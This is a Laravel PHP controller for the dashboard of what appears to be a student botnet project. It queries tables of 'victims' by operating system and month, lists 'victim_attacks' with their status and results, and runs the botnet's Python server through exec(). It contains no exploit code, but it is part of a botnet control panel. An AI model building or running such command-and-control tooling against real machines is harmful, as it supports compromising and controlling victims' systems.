<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\User;
use App\Models\Network;
use Illuminate\Support\Facades\DB;

class HomeController extends Controller
{
    public function index()
    {
        $username = auth()->user()->prenom;
        $name = auth()->user()->nom;

        // Récupérer le nombre d'utilisateurs inscrits par mois
        $userCounts = User::select(DB::raw("COUNT(*) as count, MONTH(created_at) as month"))
            ->groupBy(DB::raw("MONTH(created_at)"))
            ->get();

        // Initialiser des tableaux pour stocker les données du graphique
        $months = [];
        $userRegistrationCounts = [];

        // Remplir les tableaux avec les données récupérées
        foreach ($userCounts as $userCount) {
            $months[] = \DateTime::createFromFormat('!m', $userCount->month)->format('F');
            $userRegistrationCounts[] = $userCount->count;
        }

        // Récupérer le nombre de groupes créés
        $networkCount = Network::count();

        // Exécute la commande --showall --target victim_attacks
        exec('/home/debian/PA-BOTNET-PYSRV/venv/bin/python /home/debian/PA-BOTNET-PYSRV/main.py --showall --target victim_attacks', $output, $return);
        //exec('/home/quentin/Documents/Projet_Ann_3ème/vitual_env/bin/python /home/quentin/Documents/Projet_Ann_3ème/PA-BOTNET-PYSRV/main.py --showall --target victim_attacks', $output, $return);


        $botnetRunning = (new BotnetController)->botnet_is_running();

        $osCounts = DB::table('victims')
              ->select('os', DB::raw('count(*) as total'))
              ->groupBy('os')
              ->get();

        $osLabels = [];
        $osData = [];

        foreach ($osCounts as $os) {
            $osLabels[] = $os->os; // Assume 'os' is the field that holds the OS type
            $osData[] = $os->total;
        }

        $victimsCounts = DB::table('victims')
                   ->select(DB::raw('COUNT(*) as count, MONTH(created_at) as month'))
                   ->whereYear('created_at', date('Y')) // Filtrer pour l'année courante, ou adapter selon besoin
                   ->groupBy(DB::raw('MONTH(created_at)'))
                   ->orderBy('month')
                   ->get();

        $victimMonths = [];
        $victimCounts = [];

        foreach ($victimsCounts as $count) {
            $victimMonths[] = \DateTime::createFromFormat('!m', $count->month)->format('F');
            $victimCounts[] = $count->count;
        }

        $attacks = DB::table('victim_attacks')  // Assurez-vous que le nom de la table est correct
             ->select('id', 'type', 'state as status', 'result', 'created_at as date_de_lancement')
             ->orderBy('created_at', 'desc')
             ->get();


        return view('home', [
            'months' => json_encode($months), // Convertir en format JSON pour le script du graphique
            'userRegistrationCounts' => json_encode($userRegistrationCounts),
            'networkCount' => $networkCount,
            'botnetRunning' => $botnetRunning,
            'osLabels' => json_encode($osLabels),
            'osData' => json_encode($osData),
            'victimMonths' => json_encode($victimMonths),
            'victimCounts' => json_encode($victimCounts),
            'attacks' => $attacks
        ]);
    }



}
